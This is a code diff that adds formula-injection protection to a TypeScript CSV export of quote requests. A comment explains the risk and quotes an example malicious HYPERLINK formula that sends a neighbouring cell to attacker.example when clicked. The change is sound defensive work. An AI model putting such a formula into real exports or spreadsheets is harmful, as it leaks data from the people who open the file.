@@ -5,9 +5,29 @@ import type { StoredRfq } from "@/lib/rfqStore";
  * Pure and unit-tested; the ops-authed export route streams this.
  */
 
-/** RFC 4180 field escaping. */
+/**
+ * Neutralises a field a spreadsheet would otherwise run as a formula.
+ *
+ * RFC 4180 quoting is about parsing, not safety: Excel and Google Sheets
+ * evaluate a leading =, +, -, @, tab or CR even inside a quoted field. Every
+ * text column here is typed by whoever filled in the request form, and this
+ * file exists to be opened in a spreadsheet — a company name of
+ * `=HYPERLINK("http://attacker.example/?d="&A1,"Open invoice")` renders as a
+ * working link in the desk's copy and sends the neighbouring cell to whoever
+ * asked for it when clicked.
+ *
+ * Prefixing with an apostrophe is the standard mitigation: spreadsheets read
+ * it as "the rest is text". It is visible in some tools, which is the accepted
+ * trade — a stray apostrophe in front of an odd company name is a smaller
+ * problem than the desk's spreadsheet dialling out.
+ */
+function deFormula(s: string): string {
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
+/** RFC 4180 field escaping, over a value that can no longer act as a formula. */
 function csvField(v: unknown): string {
-  const s = String(v ?? "");
+  const s = deFormula(String(v ?? ""));
   return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
 }
 
